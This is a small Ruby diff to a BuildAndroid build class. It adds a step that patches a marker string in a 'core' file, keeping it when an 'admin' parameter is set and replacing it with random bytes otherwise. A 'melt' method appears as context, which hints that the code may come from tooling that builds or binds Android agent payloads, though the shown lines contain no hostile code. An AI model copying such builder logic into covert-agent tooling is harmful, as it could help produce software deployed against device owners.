@@ -58,6 +58,17 @@ class BuildAndroid < Build
       super
     end
 
+    patch_file(:file => params[:core]) do |content|
+      begin
+        method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.random_bytes(16)
+        content['IrXCtyrrDXMJEvOU'] = method
+      rescue
+        raise "Working method marker not found"
+      ensure
+        content
+      end
+    end
+
   end
 
   def melt(params)
